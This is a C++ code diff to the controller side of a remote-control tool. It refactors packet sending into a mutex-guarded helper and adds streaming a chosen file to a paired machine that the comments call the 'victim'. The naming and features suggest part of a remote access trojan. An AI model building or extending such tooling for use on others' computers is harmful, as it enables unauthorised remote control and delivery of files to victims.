@@ -31,7 +31,7 @@ Controller::Controller()
 void Controller::controlWindow()
 {
     //set all keys to the current key states
-    bool keys[255];
+    bool keys[256];
     for (int i = 0; i < 256; i++)
         keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
 
@@ -40,7 +40,7 @@ void Controller::controlWindow()
         if (Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
             sf::Packet p;
             p << sf::Uint8('r');
-            server.send(p);
+            sendServer(p);
             lastAwakeSignal = Mlib::currentTime().asMil();
         }
 
@@ -74,13 +74,13 @@ void Controller::controlWindow()
             if (sendKeys) {
                 sf::Packet p;
                 p << sf::Uint8('z');
-                server.send(p);
+                sendServer(p);
             }
             //stop controlling mouse
             if (sendMouse) {
                 sf::Packet p;
                 p << sf::Uint8('x');
-                server.send(p);
+                sendServer(p);
             }
         }
 
@@ -94,20 +94,20 @@ void Controller::controlWindow()
                 if (sendKeys) {
                     sf::Packet p;
                     p << sf::Uint8('z');
-                    server.send(p);
+                    sendServer(p);
                 }
                 //stop controlling mouse
                 if (sendMouse) {
                     sf::Packet p;
                     p << sf::Uint8('x');
-                    server.send(p);
+                    sendServer(p);
                 }
             }
             else if (e.type == sf::Event::MouseWheelScrolled && sendMouse && !areSettingsOpen)
             {
                 sf::Packet p;
                 p << sf::Uint8('k') << sf::Int8(e.mouseWheelScroll.delta);
-                server.send(p);
+                sendServer(p);
             }   
         }
 
@@ -118,7 +118,7 @@ void Controller::controlWindow()
             if (sendKeys) {
                 sf::Packet p;
                 p << sf::Uint8('z');
-                server.send(p);
+                sendServer(p);
             }
         }
         else if (!insState && keys[0x2D]) {
@@ -126,7 +126,7 @@ void Controller::controlWindow()
             if (sendKeys) {
                 sf::Packet p;
                 p << sf::Uint8('a');
-                server.send(p);
+                sendServer(p);
             }
         }
         keys[0x2D] = insState;
@@ -137,7 +137,7 @@ void Controller::controlWindow()
             float x = mousePos.x / float(screenSize.x), y = mousePos.y / float(screenSize.y);
             sf::Packet p;
             p << sf::Uint8('l') << sf::Uint16(x * 256 * 256) << sf::Uint16(y * 256 * 256);
-            server.send(p);
+            sendServer(p);
         }
         lastMousePos = mousePos;
 
@@ -154,33 +154,38 @@ void Controller::controlWindow()
                 if (!state && keys[i]) {
                     sf::Packet p;
                     p << sf::Uint8('m') << sf::Uint8(i);
-                    server.send(p);
+                    sendServer(p);
                 }
                 else if (releaseEvent) {
                     sf::Packet p;
                     p << sf::Uint8('n') << sf::Uint8(i);
-                    server.send(p);
+                    sendServer(p);
                 }
             }
             if (areSettingsOpen && i >= 0x30 && i <= 0x39 && state && !keys[i]) {
-                if (i == 0x30) {
+                int key = i - 48;
+                if (key == 0) {
                     isControlling = false;
                 }
-                else if (i == 0x31) {
+                else if (key == 1) {
                     sendMouse = !sendMouse;
                     if (sendMouse) {
                         sf::Packet p;
                         p << sf::Uint8('s');
-                        server.send(p);
+                        sendServer(p);
                     }
                     else {
                         sf::Packet p;
                         p << sf::Uint8('x');
-                        server.send(p);
+                        sendServer(p);
                     }
                 }
-                else if (i == 0x32) {
+                else if (key == 2) {
                     sendKeys = !sendKeys;
+                }
+                else if (key == 3) {
+                    std::thread sendFile(&Controller::startSendingFile, this);
+                    sendFile.detach();
                 }
             }
 
@@ -188,6 +193,7 @@ void Controller::controlWindow()
         }
 
         w.clear(sf::Color(60, 60, 60));
+
         std::string str("SETTINGS [ins] = ");
         str += ((areSettingsOpen) ? "OPEN\n" : "CLOSED\n");
         str += "MOUSE [1] = ";
@@ -206,8 +212,7 @@ void Controller::controlWindow()
 
 void Controller::receiveInfo()
 {
-    while (true)
-    {
+    while (true) {
         sf::Packet p;
         server.receive(p);
         //disconnect server if packet is invalid
@@ -267,6 +272,30 @@ void Controller::receiveInfo()
             file.write(name.c_str(), name.size());
             file.close();
         }
+        //send next 
+        else if (cmd == 'y') {
+            if (file != nullptr) {
+                char buffer[10'000];
+                file->read(buffer, 10'000);
+                size_t bytesRead = file->gcount();
+
+                if (bytesRead > 0) {
+                    sf::Packet p;
+                    p << sf::Uint8('o');
+                    p.append(buffer, bytesRead);
+                    sendServer(p);
+                    continue;
+                }
+                else {
+                    file->close();
+                    delete file;
+                }
+            }
+
+            sf::Packet p;
+            p << sf::Uint8('i');
+            sendServer(p);
+        }
     }
 }
 void Controller::takeCmdInput()
@@ -302,7 +331,7 @@ void Controller::takeCmdInput()
 
                 sf::Packet p;
                 p << sf::Uint8('p') << v.id;
-                server.send(p);
+                sendServer(p);
                 break;
             }
         }
@@ -310,7 +339,7 @@ void Controller::takeCmdInput()
         else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
             sf::Packet p;
             p << sf::Uint8('u');
-            server.send(p);
+            sendServer(p);
         }
         //start controlling the victim
         else if (cmd.substr(0, 7) == "control" && isPaired) {
@@ -340,7 +369,7 @@ void Controller::takeCmdInput()
 
                 sf::Packet p;
                 p << sf::Uint8('e') << v.id;
-                server.send(p);
+                sendServer(p);
                 break;
             }
             for (const auto& c : controllers) {
@@ -349,7 +378,7 @@ void Controller::takeCmdInput()
 
                 sf::Packet p;
                 p << sf::Uint8('e') << c.id;
-                server.send(p);
+                sendServer(p);
                 break;
             }
         }
@@ -386,7 +415,7 @@ void Controller::takeCmdInput()
 
                 sf::Packet p;
                 p << sf::Uint8('w') << v.id << name;
-                server.send(p);
+                sendServer(p);
                 break;
             }
             for (const auto& c : controllers) {
@@ -395,7 +424,7 @@ void Controller::takeCmdInput()
 
                 sf::Packet p;
                 p << sf::Uint8('w') << c.id << name;
-                server.send(p);
+                sendServer(p);
                 break;
             }
         }
@@ -413,7 +442,7 @@ init:
     sf::Packet p;
     p << sf::Uint8('c') << name;
     //tell server the role and the name
-    if (server.send(p) == sf::Socket::Disconnected)
+    if (sendServer(p) == sf::Socket::Disconnected)
         goto connect;
 
     p.clear();
@@ -462,4 +491,26 @@ void Controller::displayList()
         }
     }
     std::cout << '\n';
+}
+
+void Controller::startSendingFile()
+{        
+    std::string path = Mlib::getOpenFilePath("All Files (*.*)\0*.*\0");
+    file = new std::ifstream(path, std::ios::binary | std::ios::in);
+    if (!file->is_open())
+        return;
+
+    sf::Packet p;
+    p << sf::Uint8('f');
+    p << path.substr(path.find_first_of('.'));
+    sendServer(p);
+}
+
+sf::Socket::Status Controller::sendServer(sf::Packet& p)
+{
+    mutex.lock();
+    auto state = server.send(p);
+    mutex.unlock();
+
+    return state;
 }
